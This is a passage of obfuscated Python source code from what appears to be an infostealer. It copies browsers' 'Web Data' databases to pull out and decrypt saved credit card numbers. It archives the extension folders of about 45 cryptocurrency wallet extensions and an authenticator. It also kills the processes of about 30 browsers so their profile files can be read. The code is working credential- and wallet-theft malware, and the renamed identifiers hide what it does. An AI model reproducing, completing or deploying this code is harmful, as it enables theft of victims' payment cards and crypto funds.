            MOMXCZLZPTQVKZTCTPCAIRMJUVYOQOOQASFOXDWTNDXPUDKEZTOEAQIFQTLATNLGMBTQYOWRMVMETPIU.append(f"{ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX}\n{IQOOUSNRTOPSFLINNBZPOWNUCMEQTXUGWDVBZLKARFKCXGLOYUBGDIJGXPACZKGHXR}\n{VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD_name}\n")
            INCLDQWUGPUUYYADCVTOXEXORLVDJPEOZNQBYBAJINNVRCWNZEHGQIMZBMLSXXOHETZDY += 1

        AITQZWYLWBLQLOMETUISQOSQLAVRYNRWBEFHUTVOSGUPXNSXWPMUNRKKPUCHZHMQZPEGIYQACCFZVDHDLZRON.close()
    
    def CFTMQREWCMAAPOLRJVHAPWKOMUDJINKLRCRYXIYETXSXWJBGQEZQPEANIKKKVILKHMC(VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD, QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU, JOLEIIKMPBNXCKPEVCBMEBLCWFIERKYNKTXSXUBNAZLZFPWHFWXEDIVYNSMKWBNCGWIXWUNCDBZORTEWYMYNNOVD):
        global LISEGTYKRSPENLCUCKWPKXUAASUEMTLSWLQWOBPZUXRGMHLGYQWCZKYEFHY
        YTDTDYLDTUCYEMQDBIVKIGVPUABENTDJAFMSOPBAWTOMAAJUUJYRKAIAMNQFRGRMOIGJLPASDIWHJGRAXVWFGQOWPAD = os.path.join(QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU, 'Web Data')
        if not os.path.exists(YTDTDYLDTUCYEMQDBIVKIGVPUABENTDJAFMSOPBAWTOMAAJUUJYRKAIAMNQFRGRMOIGJLPASDIWHJGRAXVWFGQOWPAD):
            return

        AITQZWYLWBLQLOMETUISQOSQLAVRYNRWBEFHUTVOSGUPXNSXWPMUNRKKPUCHZHMQZPEGIYQACCFZVDHDLZRON = sqlite3.connect(":memory:")
        YNKHJGKUNXGDJOYIPJMEQMKKCZXGXRHBNVPMWHQFGTACHKJOGRIWVDVOUTDJHFFXVZZKGLXDLOYQHLKPRBDBIZWYBH = sqlite3.connect(YTDTDYLDTUCYEMQDBIVKIGVPUABENTDJAFMSOPBAWTOMAAJUUJYRKAIAMNQFRGRMOIGJLPASDIWHJGRAXVWFGQOWPAD)
        YNKHJGKUNXGDJOYIPJMEQMKKCZXGXRHBNVPMWHQFGTACHKJOGRIWVDVOUTDJHFFXVZZKGLXDLOYQHLKPRBDBIZWYBH.backup(AITQZWYLWBLQLOMETUISQOSQLAVRYNRWBEFHUTVOSGUPXNSXWPMUNRKKPUCHZHMQZPEGIYQACCFZVDHDLZRON)
        YNKHJGKUNXGDJOYIPJMEQMKKCZXGXRHBNVPMWHQFGTACHKJOGRIWVDVOUTDJHFFXVZZKGLXDLOYQHLKPRBDBIZWYBH.close()
        ZWXFSHILGPHDPAPQNPOCOQTWLLVLVYSKOZPJPJMMLAVUJOEYHRDDDJVUHRKGWWLDL = AITQZWYLWBLQLOMETUISQOSQLAVRYNRWBEFHUTVOSGUPXNSXWPMUNRKKPUCHZHMQZPEGIYQACCFZVDHDLZRON.cursor()
        ZWXFSHILGPHDPAPQNPOCOQTWLLVLVYSKOZPJPJMMLAVUJOEYHRDDDJVUHRKGWWLDL.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for v4r_row in ZWXFSHILGPHDPAPQNPOCOQTWLLVLVYSKOZPJPJMMLAVUJOEYHRDDDJVUHRKGWWLDL.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ =             f"- Name             : {v4r_row[0]}"
            PNFKQALWRFLCGTVLJEFZNMGWVGCFOVWWLLOCKDKQMDWTKNOVSHYSHKROTFJVAYJLNEBLYMTNGESEIWYIYPOTXFJZCAZYGHPV = f"  Expiration Month : {v4r_row[1]}"
            RXRAMPRRQWXRPDQJCMZMBQZYGSCDDHASBEYVMQKDMMOPHQJGIIFHEUYX =  f"  Expiration Year  : {v4r_row[2]}"
            ABKUNEZLGWIILDMFWFNFTHTZZCCFIPOVDTZBWBEGTTYFZSINDAZTSOTPZIRENKLISJHPHYR =      f"  Card Number      : {TVUVQKUHGITWECGYXHUAGRVGAZQCYWWJRFKJMCFHAQKKUDUWSAYQKZGHBMZGQQJYAMNJHUMP(v4r_row[3], JOLEIIKMPBNXCKPEVCBMEBLCWFIERKYNKTXSXUBNAZLZFPWHFWXEDIVYNSMKWBNCGWIXWUNCDBZORTEWYMYNNOVD)}"
            UWURFJEADROIZBKBZKGNEHBJZFBJSOLTEHDJBOXPIDCRGVCEVRFNFGYK =    f"  Date Modified    : {v4r_row[4]}"
            VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD_name =     f"  Browser          : {VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD}"
            GPGHXOWATMAYHVYISHFGQTXGMKVWDPBNGBRJVWQRJTXGBKYSFHGGKDBJNNCK.append(f"{WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ}\n{PNFKQALWRFLCGTVLJEFZNMGWVGCFOVWWLLOCKDKQMDWTKNOVSHYSHKROTFJVAYJLNEBLYMTNGESEIWYIYPOTXFJZCAZYGHPV}\n{RXRAMPRRQWXRPDQJCMZMBQZYGSCDDHASBEYVMQKDMMOPHQJGIIFHEUYX}\n{ABKUNEZLGWIILDMFWFNFTHTZZCCFIPOVDTZBWBEGTTYFZSINDAZTSOTPZIRENKLISJHPHYR}\n{UWURFJEADROIZBKBZKGNEHBJZFBJSOLTEHDJBOXPIDCRGVCEVRFNFGYK}\n{VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD_name}\n")
            LISEGTYKRSPENLCUCKWPKXUAASUEMTLSWLQWOBPZUXRGMHLGYQWCZKYEFHY += 1
        
        AITQZWYLWBLQLOMETUISQOSQLAVRYNRWBEFHUTVOSGUPXNSXWPMUNRKKPUCHZHMQZPEGIYQACCFZVDHDLZRON.close()

    def DAKTSPFAZZDDPQJUOYTPWDUGARTRIBHAWKGTEZQSFVTJFEBMRANBOUBYXXISUFUHYDZOE(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG, WOQKZBBYGMGQIMGMCEDGNSBDIONOOLDMRRAXFABKJAYAAXBWLNDTCOIUEDWN, VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD, QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU):
        global AGTZIMNEBIIUMATLJGDEKDVBTAGANSFXMUQRIKWNWMKBASCCBXMIKQGFPBTQFNHVEFLCUWFOIQBWGMUIEIYVK
        QYYHIRCMAZLVQKIQHTFCZLVVHZKMLMVGSCAKEIXAQYLKCCHPEZELXJPNXABUMYVISPRGIWTBAQYEFLVQZG = os.path.join(QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU, 'Extensions')
        RVSQSTEQHHVIZIBYGXDAJVQHWVCYXEHISRGBNRVBQVXJIOQUUNNOTHLQRLWKFVMBZSJOKPINGKTPGOGWLKWEPQJ = os.path.join("Extensions", VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD)

        if not os.path.exists(QYYHIRCMAZLVQKIQHTFCZLVVHZKMLMVGSCAKEIXAQYLKCCHPEZELXJPNXABUMYVISPRGIWTBAQYEFLVQZG):
            return 

        IVIKXSRQCZQBXGRKBFBDLULUCFJNHVNTUDNCUJCRJNISTDXZHLHDTVVOMBGMFVK = [v4r_item for v4r_item in os.listdir(QYYHIRCMAZLVQKIQHTFCZLVVHZKMLMVGSCAKEIXAQYLKCCHPEZELXJPNXABUMYVISPRGIWTBAQYEFLVQZG) if os.path.isdir(os.path.join(QYYHIRCMAZLVQKIQHTFCZLVVHZKMLMVGSCAKEIXAQYLKCCHPEZELXJPNXABUMYVISPRGIWTBAQYEFLVQZG, v4r_item))]
        
        for v4r_extention in IVIKXSRQCZQBXGRKBFBDLULUCFJNHVNTUDNCUJCRJNISTDXZHLHDTVVOMBGMFVK:
            if "Temp" in v4r_extention:
                continue
            
            AGTZIMNEBIIUMATLJGDEKDVBTAGANSFXMUQRIKWNWMKBASCCBXMIKQGFPBTQFNHVEFLCUWFOIQBWGMUIEIYVK += 1
            YKDECKCAJYGWZUBEVTFIQPLWMOISGZWVIZWPSGNXKBSMICAPYAKFJNDOZFVMBJKVARQCOQFOLJGLCTMNKBTSLXRF = False
            
            for v4r_extension_name, v4r_extension_folder in WOQKZBBYGMGQIMGMCEDGNSBDIONOOLDMRRAXFABKJAYAAXBWLNDTCOIUEDWN:
                if v4r_extention == v4r_extension_folder:
                    YKDECKCAJYGWZUBEVTFIQPLWMOISGZWVIZWPSGNXKBSMICAPYAKFJNDOZFVMBJKVARQCOQFOLJGLCTMNKBTSLXRF = True
                    
                    QODOCGRCUPNZAWYHJYYCBZSNDFRMDHREHWBTLWFADVRIZTWCCRSUUGIIVD = os.path.join(RVSQSTEQHHVIZIBYGXDAJVQHWVCYXEHISRGBNRVBQVXJIOQUUNNOTHLQRLWKFVMBZSJOKPINGKTPGOGWLKWEPQJ, v4r_extension_name, v4r_extention)
                    
                    IUUIXSCRVIEPNHTAMWRRAFIJXPVJEFQMJZUMHIJPOLHURPIOXDSGTKYFUDGYOHQLFUUSGKDQJSFUOVABMTUXOLRHVMV = os.path.join(QYYHIRCMAZLVQKIQHTFCZLVVHZKMLMVGSCAKEIXAQYLKCCHPEZELXJPNXABUMYVISPRGIWTBAQYEFLVQZG, v4r_extention)
                    for v4r_item in os.listdir(IUUIXSCRVIEPNHTAMWRRAFIJXPVJEFQMJZUMHIJPOLHURPIOXDSGTKYFUDGYOHQLFUUSGKDQJSFUOVABMTUXOLRHVMV):
                        OEKXOUGFXAQCPHLPFSBULPCKHBGVNBMCYYIONWJUSONQJOCHTTVXGBWPZDMEEHZGWRNRLXNHGHTZMNGKETLEPIHIIKUKELSGR = os.path.join(IUUIXSCRVIEPNHTAMWRRAFIJXPVJEFQMJZUMHIJPOLHURPIOXDSGTKYFUDGYOHQLFUUSGKDQJSFUOVABMTUXOLRHVMV, v4r_item)
                        
                        if os.path.isdir(OEKXOUGFXAQCPHLPFSBULPCKHBGVNBMCYYIONWJUSONQJOCHTTVXGBWPZDMEEHZGWRNRLXNHGHTZMNGKETLEPIHIIKUKELSGR):
                            for dirpath, dirnames, filenames in os.walk(OEKXOUGFXAQCPHLPFSBULPCKHBGVNBMCYYIONWJUSONQJOCHTTVXGBWPZDMEEHZGWRNRLXNHGHTZMNGKETLEPIHIIKUKELSGR):
                                for filename in filenames:
                                    file_path = os.path.join(dirpath, filename)
                                    arcname = os.path.relpath(file_path, IUUIXSCRVIEPNHTAMWRRAFIJXPVJEFQMJZUMHIJPOLHURPIOXDSGTKYFUDGYOHQLFUUSGKDQJSFUOVABMTUXOLRHVMV)
                                    TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG.write(file_path, os.path.join(QODOCGRCUPNZAWYHJYYCBZSNDFRMDHREHWBTLWFADVRIZTWCCRSUUGIIVD, arcname))
                        else:
                            TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG.write(OEKXOUGFXAQCPHLPFSBULPCKHBGVNBMCYYIONWJUSONQJOCHTTVXGBWPZDMEEHZGWRNRLXNHGHTZMNGKETLEPIHIIKUKELSGR, os.path.join(QODOCGRCUPNZAWYHJYYCBZSNDFRMDHREHWBTLWFADVRIZTWCCRSUUGIIVD, v4r_item))
                    break

            if not YKDECKCAJYGWZUBEVTFIQPLWMOISGZWVIZWPSGNXKBSMICAPYAKFJNDOZFVMBJKVARQCOQFOLJGLCTMNKBTSLXRF:
                ACZDMRALCAVTTNNRJJNUSQMEAPZTIORAZNXAOSSMFLYPDSLKRX = os.path.join(RVSQSTEQHHVIZIBYGXDAJVQHWVCYXEHISRGBNRVBQVXJIOQUUNNOTHLQRLWKFVMBZSJOKPINGKTPGOGWLKWEPQJ, "Unknown Extension", v4r_extention)
                
                IUUIXSCRVIEPNHTAMWRRAFIJXPVJEFQMJZUMHIJPOLHURPIOXDSGTKYFUDGYOHQLFUUSGKDQJSFUOVABMTUXOLRHVMV = os.path.join(QYYHIRCMAZLVQKIQHTFCZLVVHZKMLMVGSCAKEIXAQYLKCCHPEZELXJPNXABUMYVISPRGIWTBAQYEFLVQZG, v4r_extention)
                for v4r_item in os.listdir(IUUIXSCRVIEPNHTAMWRRAFIJXPVJEFQMJZUMHIJPOLHURPIOXDSGTKYFUDGYOHQLFUUSGKDQJSFUOVABMTUXOLRHVMV):
                    OEKXOUGFXAQCPHLPFSBULPCKHBGVNBMCYYIONWJUSONQJOCHTTVXGBWPZDMEEHZGWRNRLXNHGHTZMNGKETLEPIHIIKUKELSGR = os.path.join(IUUIXSCRVIEPNHTAMWRRAFIJXPVJEFQMJZUMHIJPOLHURPIOXDSGTKYFUDGYOHQLFUUSGKDQJSFUOVABMTUXOLRHVMV, v4r_item)
                    
                    if os.path.isdir(OEKXOUGFXAQCPHLPFSBULPCKHBGVNBMCYYIONWJUSONQJOCHTTVXGBWPZDMEEHZGWRNRLXNHGHTZMNGKETLEPIHIIKUKELSGR):
                        for dirpath, dirnames, filenames in os.walk(OEKXOUGFXAQCPHLPFSBULPCKHBGVNBMCYYIONWJUSONQJOCHTTVXGBWPZDMEEHZGWRNRLXNHGHTZMNGKETLEPIHIIKUKELSGR):
                            for filename in filenames:
                                file_path = os.path.join(dirpath, filename)
                                arcname = os.path.relpath(file_path, IUUIXSCRVIEPNHTAMWRRAFIJXPVJEFQMJZUMHIJPOLHURPIOXDSGTKYFUDGYOHQLFUUSGKDQJSFUOVABMTUXOLRHVMV)
                                TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG.write(file_path, os.path.join(ACZDMRALCAVTTNNRJJNUSQMEAPZTIORAZNXAOSSMFLYPDSLKRX, arcname))
                    else:
                        TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG.write(OEKXOUGFXAQCPHLPFSBULPCKHBGVNBMCYYIONWJUSONQJOCHTTVXGBWPZDMEEHZGWRNRLXNHGHTZMNGKETLEPIHIIKUKELSGR, os.path.join(ACZDMRALCAVTTNNRJJNUSQMEAPZTIORAZNXAOSSMFLYPDSLKRX, v4r_item))

    VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD_files = [
        ("Google Chrome",          os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Google", "Chrome", "User Data"),                 "chrome.exe"),
        ("Google Chrome SxS",      os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Google", "Chrome SxS", "User Data"),             "chrome.exe"),
        ("Google Chrome Beta",     os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Google", "Chrome Beta", "User Data"),            "chrome.exe"),
        ("Google Chrome Dev",      os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Google", "Chrome Dev", "User Data"),             "chrome.exe"),
        ("Google Chrome Unstable", os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Google", "Chrome Unstable", "User Data"),        "chrome.exe"),
        ("Google Chrome Canary",   os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Google", "Chrome Canary", "User Data"),          "chrome.exe"),
        ("Microsoft Edge",         os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Microsoft", "Edge", "User Data"),                "msedge.exe"),
        ("Opera",                  os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR, "Opera Software", "Opera Stable"),                "opera.exe"),
        ("Opera GX",               os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR, "Opera Software", "Opera GX Stable"),             "opera.exe"),
        ("Opera Neon",             os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR, "Opera Software", "Opera Neon"),                  "opera.exe"),
        ("Brave",                  os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "BraveSoftware", "Brave-Browser", "User Data"),   "brave.exe"),
        ("Vivaldi",                os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Vivaldi", "User Data"),                          "vivaldi.exe"),
        ("Internet Explorer",      os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Microsoft", "Internet Explorer"),                "iexplore.exe"),
        ("Amigo",                  os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Amigo", "User Data"),                            "amigo.exe"),
        ("Torch",                  os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Torch", "User Data"),                            "torch.exe"),
        ("Kometa",                 os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Kometa", "User Data"),                           "kometa.exe"),
        ("Orbitum",                os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Orbitum", "User Data"),                          "orbitum.exe"),
        ("Cent Browser",           os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "CentBrowser", "User Data"),                      "centbrowser.exe"),
        ("7Star",                  os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "7Star", "7Star", "User Data"),                   "7star.exe"),
        ("Sputnik",                os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Sputnik", "Sputnik", "User Data"),               "sputnik.exe"),
        ("Epic Privacy Browser",   os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Epic Privacy Browser", "User Data"),             "epic.exe"),
        ("Uran",                   os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "uCozMedia", "Uran", "User Data"),                "uran.exe"),
        ("Yandex",                 os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Yandex", "YandexBrowser", "User Data"),          "yandex.exe"),
        ("Yandex Canary",          os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Yandex", "YandexBrowserCanary", "User Data"),    "yandex.exe"),
        ("Yandex Developer",       os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Yandex", "YandexBrowserDeveloper", "User Data"), "yandex.exe"),
        ("Yandex Beta",            os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Yandex", "YandexBrowserBeta", "User Data"),      "yandex.exe"),
        ("Yandex Tech",            os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Yandex", "YandexBrowserTech", "User Data"),      "yandex.exe"),
        ("Yandex SxS",             os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Yandex", "YandexBrowserSxS", "User Data"),       "yandex.exe"),
        ("Iridium",                os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Iridium", "User Data"),                          "iridium.exe"),
        ("Mozilla Firefox",        os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR, "Mozilla", "Firefox", "Profiles"),                "firefox.exe"),
        ("Safari",                 os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR, "Apple Computer", "Safari"),                      "safari.exe"),
    ]

    VFIVEUXFZNZEFPUXNPPCWLSKQSJNNQURKGBTOAMRJHMXDPGGLNJWYLVHIVFASMSYCKEBOWRQGJALJMWQMOCCPDLGMHDEP = [
        '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
    ]

    WOQKZBBYGMGQIMGMCEDGNSBDIONOOLDMRRAXFABKJAYAAXBWLNDTCOIUEDWN = [
        ("Metamask",        "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        ("Metamask",        "ejbalbakoplchlghecdalmeeeajnimhm"),
        ("Binance",         "fhbohimaelbohpjbbldcngcnapndodjp"),
        ("Coinbase",        "hnfanknocfeofbddgcijnmhnfnkdnaad"),
        ("Ronin",           "fnjhmkhhmkbjkkabndcnnogagogbneec"),
        ("Trust",           "egjidjbpglichdcondbcbdnbeeppgdph"),
        ("Venom",           "ojggmchlghnjlapmfbnjholfjkiidbch"),
        ("Sui",             "opcgpfmipidbgpenhmajoajpbobppdil"),
        ("Martian",         "efbglgofoippbgcjepnhiblaibcnclgk"),
        ("Tron",            "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
        ("Petra",           "ejjladinnckdgjemekebdpeokbikhfci"),
        ("Pontem",          "phkbamefinggmakgklpkljjmgibohnba"),
        ("Fewcha",          "ebfidpplhabeedpnhjnobghokpiioolj"),
        ("Math",            "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
        ("Coin98",          "aeachknmefphepccionboohckonoeemg"),
        ("Authenticator",   "bhghoamapcdpbohphigoooaddinpkbai"),
        ("ExodusWeb3",      "aholpfdialjgjfhomihkjbmgjidlcdno"),
        ("Phantom",         "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
        ("Core",            "agoakfejjabomempkjlepdflaleeobhb"),
        ("Tokenpocket",     "mfgccjchihfkkindfppnaooecgfneiii"),
        ("Safepal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
        ("Solfare",         "bhhhlbepdkbapadjdnnojkbgioiodbic"),
        ("Kaikas",          "jblndlipeogpafnldhgmapagcccfchpi"),
        ("iWallet",         "kncchdigobghenbbaddojjnnaogfppfj"),
        ("Yoroi",           "ffnbelfdoeiohenkjibnmadjiehjhajb"),
        ("Guarda",          "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
        ("Jaxx Liberty",    "cjelfplplebdjjenllpjcblmjkfcffne"),
        ("Wombat",          "amkmjjmmflddogmhpjloimipbofnfjih"),
        ("Oxygen",          "fhilaheimglignddkjgofkcbgekhenbh"),
        ("MEWCX",           "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
        ("Guild",           "nanjmdknhkinifnkgdcggcfnhdaammmj"),
        ("Saturn",          "nkddgncdjgjfcddamfgcmfnlhccnimig"),
        ("TerraStation",    "aiifbnbfobpmeekipheeijimdpnlpgpp"),
        ("HarmonyOutdated", "fnnegphlobjdpkhecapkijjdkgcjhkib"),
        ("Ever",            "cgeeodpfagjceefieflmdfphplkenlfk"),
        ("KardiaChain",     "pdadjkfkgcafgbceimcpbkalnfnepbnk"),
        ("PaliWallet",      "mgffkfbidihjpoaomajlbgchddlicgpn"),
        ("BoltX",           "aodkkagnadcbobfpggfnjeongemjbjca"),
        ("Liquality",       "kpfopkelmapcoipemfendmdcghnegimn"),
        ("XDEFI",           "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
        ("Nami",            "lpfcbjknijpeeillifnkikgncikgfhdo"),
        ("MaiarDEFI",       "dngmlblcodfobpdpecaadgfbcggfjfnm"),
        ("TempleTezos",     "ookjlbkiijinhpmnjffcofjonbfbgaoc"),
        ("XMR.PT",          "eigblbgjknlfbajkfhopmcojidlgcehm")
    ]
    
    try:
        for WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ, ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX, v4r_proc_name in VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD_files:
            for v4r_proc in psutil.process_iter(['pid', 'name']):
                try:
                    if v4r_proc.name().lower() == v4r_proc_name.lower():
                        v4r_proc.terminate()
                except:
                    pass
    except:
        pass

    for WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ, ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX, v4r_proc_name in VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD_files:
        if not os.path.exists(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX):
            continue

        JOLEIIKMPBNXCKPEVCBMEBLCWFIERKYNKTXSXUBNAZLZFPWHFWXEDIVYNSMKWBNCGWIXWUNCDBZORTEWYMYNNOVD = BNMUPVSSCLRTESZZQAIPQMKCYJFBGPUNRBJVCRGLXGLIVXWGUATXNLTYTDXSFDNGHOTVATXBSHXP(os.path.join(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX, 'Local State'))
        if not JOLEIIKMPBNXCKPEVCBMEBLCWFIERKYNKTXSXUBNAZLZFPWHFWXEDIVYNSMKWBNCGWIXWUNCDBZORTEWYMYNNOVD:
            continue

        for v4r_profile in VFIVEUXFZNZEFPUXNPPCWLSKQSJNNQURKGBTOAMRJHMXDPGGLNJWYLVHIVFASMSYCKEBOWRQGJALJMWQMOCCPDLGMHDEP:
            QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU = os.path.join(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX, v4r_profile)
            if not os.path.exists(QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU):
                continue

        for v4r_profile in VFIVEUXFZNZEFPUXNPPCWLSKQSJNNQURKGBTOAMRJHMXDPGGLNJWYLVHIVFASMSYCKEBOWRQGJALJMWQMOCCPDLGMHDEP:
            QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU = os.path.join(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX, v4r_profile)
